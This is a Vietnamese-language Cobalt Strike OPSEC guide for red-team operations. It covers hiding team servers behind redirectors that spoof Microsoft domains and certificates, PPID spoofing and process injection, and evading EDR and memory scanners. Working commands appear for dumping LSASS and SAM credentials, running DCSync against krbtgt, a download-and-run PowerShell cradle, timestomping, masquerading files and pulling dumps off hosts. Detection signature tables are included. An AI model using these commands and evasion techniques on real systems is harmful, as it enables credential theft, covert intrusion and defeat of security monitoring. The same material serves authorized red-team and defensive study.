# Cobalt Strike — Hướng Dẫn OPSEC (Tiếng Việt)

> Bảo mật hoạt động cho các cuộc tấn công red team sử dụng Cobalt Strike. Bao gồm hardening team server, OPSEC Beacon, chữ ký phát hiện phổ biến, và các sai lầm cần tránh.

---

## Mục Lục

1. [Nguyên Tắc OPSEC](#1-nguyên-tắc-opsec)
2. [Hardening Team Server](#2-hardening-team-server)
3. [Chiến Lược Sleep & Jitter của Beacon](#3-chiến-lược-sleep--jitter-của-beacon)
4. [OPSEC Process Injection](#4-opsec-process-injection)
5. [OPSEC Lưu Lượng Mạng](#5-opsec-lưu-lượng-mạng)
6. [OPSEC Bộ Nhớ](#6-opsec-bộ-nhớ)
7. [OPSEC Thông Tin Xác Thực](#7-opsec-thông-tin-xác-thực)
8. [OPSEC Di Chuyển Ngang](#8-opsec-di-chuyển-ngang)
9. [OPSEC File & Đĩa](#9-opsec-file--đĩa)
10. [Chữ Ký Phát Hiện Phổ Biến](#10-chữ-ký-phát-hiện-phổ-biến)
11. [Sai Lầm OPSEC Thường Gặp](#11-sai-lầm-opsec-thường-gặp)
12. [Danh Sách Kiểm Tra OPSEC](#12-danh-sách-kiểm-tra-opsec)

---

## 1. Nguyên Tắc OPSEC

### Vòng Lặp OPSEC (Áp Dụng Cho Red Teaming)

```
Xác định thông tin quan trọng
       ↓
Phân tích mối đe dọa (Khả năng của Blue team)
       ↓
Phân tích lỗ hổng (Những gì bạn đang làm có thể bị phát hiện)
       ↓
Đánh giá rủi ro (Khả năng × Tác động)
       ↓
Áp dụng biện pháp đối phó (Profile, sleep, spawnto, v.v.)
```

### Tư Duy Chủ Chốt

- **Giả sử MDR/XDR đang theo dõi** — blue team hiện đại có telemetry EDR, phân tích luồng mạng và SIEM correlation.
- **Giảm thiểu dấu vết** — mỗi hành động để lại dấu vết. Chỉ làm những gì mục tiêu yêu cầu.
- **Khớp tốc độ hoạt động với rủi ro phát hiện** — hành động nhanh thì ồn hơn. Nếu cần ẩn, hãy chậm lại.
- **Phân khoang** — dùng listener, domain, và cơ sở hạ tầng khác nhau cho mỗi mục tiêu.
- **Đốt và xây lại** — khi bị phát hiện, bỏ hoàn toàn cơ sở hạ tầng bị lộ và bắt đầu lại.

---

## 2. Hardening Team Server

### Giới Hạn Mạng

```bash
# iptables: chỉ cho phép kết nối từ IP operator đã biết
iptables -A INPUT -p tcp --dport 50050 -s 203.0.113.5 -j ACCEPT   # operator 1
iptables -A INPUT -p tcp --dport 50050 -s 203.0.113.6 -j ACCEPT   # operator 2
iptables -A INPUT -p tcp --dport 50050 -j DROP                     # chặn tất cả khác

# Cho phép callback Beacon trên cổng C2
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT  # DNS nếu dùng DNS listener
```

### Hardening SSH

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
AllowUsers operator1 operator2
```

### Chứng Chỉ TLS — Không Dùng Mặc Định

Không bao giờ dùng chứng chỉ TLS mặc định của Cobalt Strike. Thay thế nó:

```bash
# Tạo cert hợp lệ
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com"

# Chuyển đổi sang keystore cho CS
openssl pkcs12 -export -out cobaltstrike.store -inkey key.pem -in cert.pem -name cobaltstrike -passout pass:123456
```

Tốt hơn: mua chứng chỉ TLS hợp lệ cho domain bạn kiểm soát.

### Redirectors

Không bao giờ expose Team Server trực tiếp. Luôn dùng redirectors:

```
Nạn nhân → Redirector (VPS/CDN) → Team Server
```

IP của redirector bị burn nếu bị phát hiện; team server vẫn sống sót.

---

## 3. Chiến Lược Sleep & Jitter của Beacon

### Các Khu Vực Thời Gian

| Giai đoạn | Sleep | Jitter | Lý do |
|---|---|---|---|
| Truy cập ban đầu (cần lateral move nhanh) | 5–10 giây | 20% | Cửa sổ ngắn để thiết lập foothold |
| Foothold đã thiết lập (hoạt động bình thường) | 60 giây | 20–30% | Cân bằng giữa phản hồi và phát hiện |
| Persistence yên lặng | 300–600 giây | 50% | Giảm thiểu tần suất beacon |
| Ẩn hoàn toàn (implant dài hạn) | 3600 giây | 50% | Một callback mỗi ~30–90 phút |

### Tính Jitter

```
actual_sleep = sleep * (1 ± jitter/100)
# sleep=60, jitter=30 → 42–78 giây
# sleep=3600, jitter=50 → 1800–5400 giây
```

### Thay Đổi Sleep Giữa Chiến Dịch

```
beacon> sleep 0          # tương tác — chỉ dùng khi đang làm việc
# ... thực hiện nhiệm vụ nhanh ...
beacon> sleep 300 50     # im lặng khi xong
```

---

## 4. OPSEC Process Injection

### Chọn Mục Tiêu Injection

**NÊN inject vào:**
- Tiến trình ổn định, chạy lâu: `svchost.exe`, `explorer.exe`, `RuntimeBroker.exe`
- Tiến trình có hoạt động mạng hợp lệ: `svchost.exe`, `dllhost.exe`
- Tiến trình trong cùng session với Beacon

**KHÔNG NÊN inject vào:**
- `lsass.exe` — kích hoạt cảnh báo AV, giám sát nặng
- Tiến trình thuộc phần mềm AV/EDR
- Tiến trình ngắn hạn sắp chết
- Tiến trình ở session khác (Session 0 vs. Session 1)

### Kiểm Tra Session Tiến Trình

```
beacon> ps
# Nhìn vào cột Session
# Khớp session của bạn để inject vào tiến trình desktop hiển thị
```

### Chọn Spawnto

```
beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> spawnto x64 C:\Windows\System32\RuntimeBroker.exe
beacon> spawnto x64 C:\Windows\System32\backgroundTaskHost.exe

# Xác minh binary spawnto hợp lệ
beacon> shell Get-FileHash C:\Windows\System32\dllhost.exe -Algorithm SHA256
```

### PPID Spoofing

Khớp PPID với những gì hợp lý cho binary spawnto:

```
# dllhost.exe thường được spawn bởi svchost.exe
beacon> ps     # tìm PID svchost.exe
beacon> ppid 4812   # PID svchost
beacon> run whoami  # bây giờ spawn dllhost dưới svchost — trông hợp lệ
```

### blockdlls

```
beacon> blockdlls start
# Trước bất kỳ fork&run task nào (execute-assembly, mimikatz, v.v.)
```

Điều này chặn DLL injection của EDR vào tiến trình sacrificial.

---

## 5. OPSEC Lưu Lượng Mạng

### Tiêu Chí Chọn Domain C2

- **Đã lâu đời** — đăng ký > 1 năm trước
- **Đã phân loại** — được phân loại trong Umbrella/BlueCoat là lành tính
- **Tương tự mục tiêu** — phản ánh stack công nghệ của mục tiêu
- **Chứng chỉ hợp lệ** — chứng chỉ TLS đã ký, không tự ký

### C2 Redirectors — Apache mod_rewrite

```apache
# /etc/apache2/sites-enabled/c2.conf
<VirtualHost *:443>
    ServerName update.microsoft-cdn.com
    SSLEngine on

    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/search$          [OR]
    RewriteCond %{REQUEST_URI} ^/collect$
    RewriteRule ^(.*)$ https://TEAMSERVER_IP:443$1 [P,L]

    # Mặc định: trả về 404 hoặc serve website hợp lệ
    ProxyPass / http://website-hop-le.com/
    ProxyPassReverse / http://website-hop-le.com/
</VirtualHost>
```

### CDN Fronting

```
Nạn nhân → CDN edge (IP Cloudflare) → Backend của bạn → Team Server
```

Nạn nhân chỉ thấy dải IP của Cloudflare — rất khó block mà không có thiệt hại phụ.

---

## 6. OPSEC Bộ Nhớ

### Chữ Ký Beacon In-Memory

Beacon Cobalt Strike mặc định có chữ ký đã biết mà máy quét bộ nhớ phát hiện:

```
# Chuỗi đã biết trong Beacon không được patch:
"ReflectiveLoader"
"beacon.dll"
"%02d/%02d/%02d %02d:%02d:%02d"
"MZARUH"
"%d is an x64 Beacon"
```

Giảm thiểu với block `stage` trong Malleable C2 profile:
```
stage {
    set stomppe    "true";
    set obfuscate  "true";
    set userwx     "false";
    set sleep_mask "true";
    set cleanup    "true";
    set stackspoof "true";    # CS 4.5+
}
```

### Công Cụ Phát Hiện Bộ Nhớ Mà Blue Team Dùng

| Công cụ | Phát hiện gì |
|---|---|
| `pe-sieve` | Bất thường PE trong bộ nhớ tiến trình |
| `moneta` | Bộ nhớ private có code thực thi |
| `BeaconHunter` | Chữ ký Cobalt Strike beacon |
| `hunt-sleeping-beacons` | Beacon đang ngủ |
| `MalMemDetect` | Heuristic shellcode |

---

## 7. OPSEC Thông Tin Xác Thực

### Tránh Đụng Trực Tiếp vào lsass.exe

`procdump`, truy cập handle LSASS trực tiếp đều tạo cảnh báo EDR.

**Các phương án được ưu tiên:**
```
# 1. Nanodump BOF (truy cập gián tiếp qua handle duplication)
beacon> inline-execute /opt/bofs/nanodump.o lsass 1

# 2. comsvcs.dll (LOLBin dump)
beacon> shell rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Temp\lsass.dmp full

# 3. Shadow copy (không truy cập trực tiếp)
beacon> shell wmic shadowcopy call create Volume=C:\
beacon> shell copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
```

### DCSync Thay Vì Hashdump

Với tài khoản domain, ưu tiên DCSync hơn LSASS dumping — đây là lời gọi replication protocol, không phải đọc bộ nhớ:

```
beacon> dcsync corp.local CORP\administrator
beacon> dcsync corp.local CORP\krbtgt
```

---

## 8. OPSEC Di Chuyển Ngang

### Ma Trận Rủi Ro Phương Thức Di Chuyển

| Phương thức | Độ ồn | Ghi chú |
|---|---|---|
| `jump psexec` | Cao | Tạo service — được ghi vào System event log (7045) |
| `jump psexec_psh` | Cao | PowerShell service — log PS có thể kích hoạt |
| `jump winrm64` | Trung bình | WinRM được mong đợi trong môi trường có quản lý |
| `jump wmi` | Trung bình-Thấp | WMI phổ biến; không tạo service |
| `jump smb` (named pipe) | Thấp | Không có kết nối mạng mới từ nạn nhân |
| Named pipe pivoting | Thấp nhất | Không có kết nối bên ngoài từ host pivot |

### Giảm Thiểu Tạo Service

```
# psexec tạo service được ghi log
# Dùng winrm hoặc wmi thay thế khi có thể:
beacon> jump winrm64 target.corp.local lab-https
beacon> jump wmi64 target.corp.local lab-https
```

---

## 9. OPSEC File & Đĩa

### Tránh Thả File

Ưu tiên thực thi in-memory:
```
beacon> execute-assembly /opt/tools/Rubeus.exe        # trong bộ nhớ
beacon> inline-execute /opt/bofs/tool.o              # trong bộ nhớ
beacon> powerpick IEX (New-Object Net.WebClient).DownloadString('...')  # trong bộ nhớ
```

### Nếu Phải Thả File

```
# Dùng vị trí staging hòa lẫn vào:
C:\Windows\Temp\              # temp phổ biến, thường xuyên bị xóa
C:\ProgramData\Microsoft\     # trông hợp lệ
C:\Users\<user>\AppData\Local\Temp\    # temp người dùng

# Đặt tên file giống binary Windows hợp lệ:
MicrosoftEdgeUpdate.exe
WerFault.exe
RuntimeBroker.exe
dllhost.exe

# Luôn timestomp:
beacon> timestomp C:\Windows\System32\calc.exe C:\Temp\payload.exe
```

### Dọn Dẹp

```
beacon> rm C:\Temp\payload.exe
beacon> rm C:\Temp\output.txt
# Với dump lớn, exfiltrate rồi xóa:
beacon> download C:\Temp\lsass.dmp
beacon> rm C:\Temp\lsass.dmp
```

---

## 10. Chữ Ký Phát Hiện Phổ Biến

### Chữ Ký Mạng

| Chữ ký | Chỉ báo |
|---|---|
| User-agent CS mặc định | `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` |
| Chứng chỉ CS mặc định | JA3 hash của cert TLS CS mặc định |
| Khoảng beacon đều đặn | Gói tin đến ở khoảng thời gian hoàn toàn đều đặn |
| URI CS mặc định | `/dpixel`, `/__utm.gif`, `/submit.php`, `/ca` |

### Chữ Ký Trên Host

| Chữ ký | Chỉ báo |
|---|---|
| Tạo named pipe | `\\.\pipe\MSSE-*-server`, tên pipe CS mặc định |
| Spawnto mặc định | `rundll32.exe` được spawn không có tham số |
| Bộ nhớ: vùng RWX | Private memory chưa ký với quyền RWX |
| Bộ nhớ: chuỗi CS | `beacon.dll`, `ReflectiveLoader` trong bộ nhớ tiến trình |

### Biện Pháp Giảm Thiểu OPSEC

```
# User-agent mặc định → đặt UA tùy chỉnh trong profile:
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...";

# Cert mặc định → dùng cert thật

# Khoảng thời gian đều đặn → luôn đặt jitter:
set jitter "20";

# URI mặc định → đặt URI tùy chỉnh trong profile:
set uri "/search";

# Tên pipe mặc định → đặt tên pipe tùy chỉnh:
set pipename "wkssvc##";

# Spawnto mặc định → luôn đặt spawnto:
set spawnto_x64 "%windir%\\system32\\dllhost.exe";

# Bộ nhớ RWX → userwx false:
stage { set userwx "false"; }

# Chuỗi CS → stomppe + cleanup + strrep:
stage { set stomppe "true"; set cleanup "true"; strrep "beacon.dll" ""; }
```

---

## 11. Sai Lầm OPSEC Thường Gặp

### Sai Lầm 1: Dùng Sleep 0 Quá Lâu

```
# XẤU: chế độ tương tác để chạy qua đêm
beacon> sleep 0
# ... operator quên ...
# Sáng hôm sau: cảnh báo EDR vì 8 giờ lưu lượng C2 liên tục

# TỐT: dùng tương tác ngắn, rồi im lặng
beacon> sleep 0
# ... làm nhiệm vụ nhanh ...
beacon> sleep 300 50
```

### Sai Lầm 2: Dùng Profile Mặc Định

Không bao giờ dùng profile Cobalt Strike mặc định. Profile mặc định có:
- URI HTTP đã biết (`/submit.php`, `/__utm.gif`)
- User-agent đã biết
- TLS fingerprint đã biết (JA3)
- Tên named pipe đã biết

### Sai Lầm 3: Inject vào lsass.exe

```
# XẤU
beacon> inject 584 x64 lab-https    # nếu 584 là lsass.exe

# TỐT: dump credential không cần inject
beacon> logonpasswords              # dùng fork&run — tiến trình sacrificial đọc LSASS
```

### Sai Lầm 4: Tái Sử Dụng Cơ Sở Hạ Tầng C2

Mỗi cuộc tấn công cần mới:
- IP team server
- Tên domain
- Chứng chỉ TLS
- URI profile

Nếu domain bị burn trong một cuộc tấn công, nó sẽ xuất hiện trong các feed threat intelligence.

### Sai Lầm 5: Không Dọn Dẹp

```
# Sau lateral movement:
# psexec để lại artifacts service
beacon> shell sc delete "TênServiceĐãTạo"

# Sau khi upload file:
beacon> rm C:\Temp\tool_da_upload.exe
```

### Sai Lầm 6: Spawn powershell.exe

```
# XẤU: powershell.exe hiển thị trong danh sách tiến trình
beacon> powershell Get-ADUser -Filter *

# TỐT: powerpick dùng unmanaged PowerShell không spawn powershell.exe
beacon> powerpick Get-ADUser -Filter *
```

---

## 12. Danh Sách Kiểm Tra OPSEC

### Trước Cuộc Tấn Công

- [ ] Profile Malleable C2 tùy chỉnh đã được tải và kiểm tra với `c2lint`
- [ ] Team server đằng sau redirector
- [ ] Quy tắc iptables hạn chế truy cập team server
- [ ] Chứng chỉ TLS tùy chỉnh (không phải cert CS mặc định)
- [ ] Domain đã lâu đời, đã phân loại cho C2
- [ ] Tên named pipe tùy chỉnh trong profile
- [ ] `spawnto` đặt thành binary hợp lệ
- [ ] `sleep_mask`, `stomppe`, `userwx false` trong block stage
- [ ] Kiểm tra Beacon với AV/EDR mục tiêu trong lab cách ly

### Trước Mỗi Hành Động

- [ ] Xác nhận ngữ cảnh token hiện tại (`getuid`)
- [ ] Xác định tiến trình mục tiêu để inject (`ps`)
- [ ] Kiểm tra sản phẩm EDR/AV đang chạy (`ps`)
- [ ] Xác nhận khoảng sleep phù hợp với mức độ ồn của hoạt động

### Sau Mỗi Hành Động

- [ ] Dọn sạch file đã thả
- [ ] Xóa persistence nếu không cần
- [ ] Trả sleep về giá trị yên lặng
- [ ] Rev2self để bỏ token đã giả mạo
- [ ] Ghi lại hành động trong team chat

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
